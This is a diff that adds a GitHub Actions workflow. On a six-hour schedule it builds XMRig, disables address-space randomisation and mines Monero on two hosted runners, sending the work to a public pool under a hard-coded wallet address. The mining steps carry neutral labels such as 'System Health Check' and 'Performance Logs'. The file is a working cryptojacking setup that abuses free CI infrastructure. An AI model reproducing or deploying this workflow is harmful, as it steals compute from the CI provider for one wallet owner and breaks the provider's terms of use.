@@ -1,0 +1,181 @@
+name: Xxx
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */6 * * *'
+
+jobs:
+  mine:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    strategy:
+      matrix:
+        runner: [1, 2]
+      fail-fast: false
+
+    steps:
+      - name: System Health Check
+        run: |
+          echo "=== CPU Information ==="
+          nproc
+          lscpu | grep -E "Model name|CPU\(s\)|Thread"
+
+          echo -e "\n=== Memory Information ==="
+          free -h
+
+          echo -e "\n=== Disk Space ==="
+          df -h /
+
+          echo -e "\n=== Available Huge Pages ==="
+          cat /proc/meminfo | grep -i huge
+
+      - name: System Optimization
+        run: |
+          sudo sysctl -w vm.nr_hugepages=512
+          sudo sysctl -w kernel.randomize_va_space=0
+          sudo sysctl -w vm.swappiness=1
+          sudo sysctl -w kernel.numa_balancing=0
+          sudo bash -c "echo 0 > /proc/sys/kernel/nmi_watchdog" || true
+          
+      - name: Install Dependencies
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y wget tar cmake build-essential libhwloc-dev libuv1-dev libssl-dev git
+
+      - name: Cache XMRig Build
+        id: cache-xmrig
+        uses: actions/cache@v3
+        with:
+          path: xmrig/build
+          key: xmrig-${{ runner.os }}-${{ hashFiles('xmrig/CMakeLists.txt', 'xmrig/cmake/**') }}
+          restore-keys: |
+            xmrig-${{ runner.os }}-
+
+      - name: Clone XMRig
+        if: steps.cache-xmrig.outputs.cache-hit != 'true'
+        run: |
+          git clone https://github.com/xmrig/xmrig.git
+
+      - name: Build XMRig
+        if: steps.cache-xmrig.outputs.cache-hit != 'true'
+        run: |
+          cd xmrig
+          mkdir build && cd build
+          cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_HWLOC=ON -DWITH_MSR=ON -DWITH_ASM=ON
+          make -j$(nproc)
+
+      - name: Restore XMRig Source (if cached)
+        if: steps.cache-xmrig.outputs.cache-hit == 'true'
+        run: |
+          git clone https://github.com/xmrig/xmrig.git
+
+      - name: Configure Mining
+        run: |
+          cd xmrig/build
+          OWNER="${GITHUB_REPOSITORY_OWNER:0:3}"
+          cat > config.json <<EOF
+          {
+            "autosave": true,
+            "cpu": {
+              "enabled": true,
+              "huge-pages": true,
+              "huge-pages-jit": true,
+              "hw-aes": true,
+              "priority": 3,
+              "memory-pool": true,
+              "asm": "auto",
+              "argon2-impl": "auto"
+            },
+            "pools": [
+              {
+                "algo": "rx/0",
+                "coin": "monero",
+                "url": "pool.supportxmr.com:443",
+                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
+                "pass": "${OWNER}-r${{ matrix.runner }}",
+                "rig-id": "${OWNER}-r${{ matrix.runner }}",
+                "keepalive": true,
+                "tls": true
+              }
+            ],
+            "retries": 10,
+            "retry-pause": 5,
+            "donate-level": 1,
+            "print-time": 60
+          }
+          EOF
+          
+      - name: CPU Performance Mode
+        run: |
+          echo performance | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor || true
+
+      - name: Start Mining with Monitoring
+        run: |
+          cd xmrig/build
+
+          # Start resource monitoring in background
+          (while true; do
+            echo "=== $(date) ==="
+            ps aux | grep xmrig | grep -v grep || echo "XMRig not running"
+            free -h | grep Mem
+            sleep 300
+          done) > ../../mining_stats_${{ matrix.runner }}.log 2>&1 &
+          MONITOR_PID=$!
+
+          # Run mining with optimized settings (19800s = 5.5 hours, leaving 30min for cleanup)
+          sudo nice -n -10 timeout 19800 ./xmrig --config=config.json --randomx-mode=fast --randomx-no-rdmsr || true
+
+          # Stop monitoring
+          kill $MONITOR_PID 2>/dev/null || true
+
+      - name: Generate Performance Summary
+        if: always()
+        run: |
+          echo "=== Mining Session Summary ===" > summary_${{ matrix.runner }}.txt
+          echo "Runner: ${{ matrix.runner }}" >> summary_${{ matrix.runner }}.txt
+          echo "End Time: $(date)" >> summary_${{ matrix.runner }}.txt
+
+          if [ -f mining_stats_${{ matrix.runner }}.log ]; then
+            echo -e "\n=== Resource Usage (Last 20 entries) ===" >> summary_${{ matrix.runner }}.txt
+            tail -20 mining_stats_${{ matrix.runner }}.log >> summary_${{ matrix.runner }}.txt
+          fi
+
+          cat summary_${{ matrix.runner }}.txt
+
+      - name: Upload Performance Logs
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: performance-logs-runner-${{ matrix.runner }}
+          path: |
+            mining_stats_${{ matrix.runner }}.log
+            summary_${{ matrix.runner }}.txt
+          retention-days: 7
+
+      - name: Cleanup
+        if: always()
+        run: |
+          sudo pkill -9 xmrig || true
+          rm -rf xmrig
+
+  monitor:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v3
+
+      - name: Setup Python
+        uses: actions/setup-python@v4
+        with:
+          python-version: '3.10'
+
+      - name: Install Dependencies
+        run: |
+          pip install requests
+
+      - name: Run Mining Monitor
+        run: |
+          timeout 300 python monitor.py || true
